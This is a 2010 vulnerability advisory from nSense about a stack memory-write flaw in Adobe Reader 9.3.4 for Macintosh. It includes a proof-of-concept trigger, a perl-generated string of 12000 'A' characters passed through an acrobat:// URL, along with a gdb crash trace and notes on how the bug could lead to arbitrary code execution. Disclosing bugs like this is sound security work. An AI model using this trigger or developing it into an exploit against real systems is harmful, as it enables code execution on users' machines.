Subject: nSense-2010-001: Adobe Reader for Macintosh

       nSense Vulnerability Research Security Advisory NSENSE-2010-001
       ---------------------------------------------------------------

       Affected Vendor:    Adobe
       Affected Product:   Adobe Reader 9.3.4 for Macintosh
       Platform:           OS X
       Impact:             User assisted code execution
       Vendor response:    Patch

       Technical details
       ---------------------------------------------------------------

       terminal 1:
       $ gdb --waitfor=AdobeReader

       terminal 2:
       $ open acrobat://`perl -e 'print "A" x 12000'`

       terminal 1:
       (gdb) cont
       [snip]
       Program received signal EXC_BAD_ACCESS, Could not access memory.
       Reason: KERN_INVALID_ADDRESS at address: 0xc00013d2
       0x7ffa0d6a in AcroBundleThreadQuitProc ()
       (gdb) set disassembly-flavor intel
       (gdb) x/i $pc
       0x7ffa0d6a <AcroBundleThreadQuitProc+2608>:     mov    BYTE PTR
       [ebp+eax-0x420],0x0
       (gdb) i r ebp eax
       ebp            0xbfffe908       0xbfffe908
       eax            0x2eea   12010
       (gdb)

       As can be seen from the above, we control the value in eax (in
       this case 12010, the length of the acrobat:// + the 12000 A's).

       This allows us to write the null byte anywhere in memory between
       ebp-0x420 (0xBFFFE4E8) and the end of the stack.

       The behaviour may be leveraged to modify the frame pointer,
       changing the execution flow and thus permitting arbitrary code
       execution in the context of the user running the program.
